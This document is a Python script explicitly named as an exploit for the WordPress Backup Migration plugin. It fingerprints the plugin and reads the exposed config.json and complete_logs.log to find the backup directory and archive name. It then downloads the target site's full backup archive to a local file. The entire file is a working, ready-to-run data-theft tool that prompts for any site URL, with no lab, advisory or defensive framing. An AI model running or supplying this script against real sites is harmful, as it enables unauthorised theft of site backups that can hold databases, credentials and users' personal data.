import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

def exploit_backup_migration(url):
    # Step 1: Check if the plugin is installed
    plugin_url = urljoin(url, "/wp-content/plugins/backup-backup/readme.txt")
    response = requests.get(plugin_url)
    if response.status_code != 200:
        print("The Backup Migration plugin is not installed.")
        return

    # Step 2: Get the name of the backup directory
    config_url = urljoin(url, "/wp-content/backup-migration/config.json")
    response = requests.get(config_url)
    config = response.json()
    backup_dir = config["STORAGE::LOCAL::PATH"].split("/")[-1]

    # Step 3: Get the name of the archive containing the backups
    logs_url = urljoin(url, "/wp-content/backup-migration/complete_logs.log")
    response = requests.get(logs_url)
    for line in response.text.split("\n"):
        if "BM_Backup" in line:
            archive_name = line.split(" ")[-1]
            break

    # Step 4: Build the path for the download
    backup_url = urljoin(url, f"/wp-content/backup-migration/{backup_dir}/backups/{archive_name}")
    print(f"Downloading backup file from {backup_url}")

    # Step 5: Download the backup file
    response = requests.get(backup_url)
    if response.status_code == 200:
        with open("backup.zip", "wb") as f:
            f.write(response.content)
        print("Backup file downloaded successfully.")
    else:
        print("Failed to download backup file.")

if __name__ == "__main__":
    url = input("Enter the URL of the WordPress site: ")
    exploit_backup_migration(url)
